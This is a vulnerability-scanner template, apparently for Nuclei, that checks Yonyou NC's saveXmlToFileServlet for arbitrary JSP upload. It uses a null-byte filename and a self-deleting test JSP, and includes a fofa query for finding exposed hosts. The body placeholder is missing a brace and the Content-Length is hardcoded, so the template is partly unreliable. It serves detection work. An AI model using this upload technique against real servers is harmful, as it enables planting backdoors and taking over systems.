id: yonyou-nc-savexmltofileservlet-upload
info:
  name: Yonyou NC saveXmlToFIleServlet - File Upload
  author: k3ppf0r
  severity: critical
  description: |  
    NC系统可利用saveXmlToFIleServlet接口中的filename参数实现任意文件上传，此漏洞可以给NC服务器预埋后门，从而可以随意操作服务器。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E6%8E%A5%E5%8F%A3saveXmlToFIleServlet%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
    - https://security.yonyou.com/#/noticeInfo?id=533
  metadata:
    date: 2024-03-29
    version: 用友NC65
    fofa-query: app="用友-UFIDA-NC"
  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud


variables:
  file_name: "{{to_lower(rand_text_alpha(10))}}"
  file_content: "{{to_lower(rand_text_alpha(16))}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename={{file_name}}.jsp%00"
    headers:
      Cookie: LA_K1=langid
      serverEnable: localserver
      Accept-Encoding: gzip, x-gzip, deflate
      Content-Length: 27
      Content-Type: application/octet-stream
      Content-Encoding: UTF_8
      Connection: keep-alive
    body: '<% out.println("{{file_content}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>'

  - method: GET
    path:
      - "{{BaseURL}}/portal/processxml/{{file_name}}.jsp"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "{{file_content}}"

      - type: status
        status:
          - 200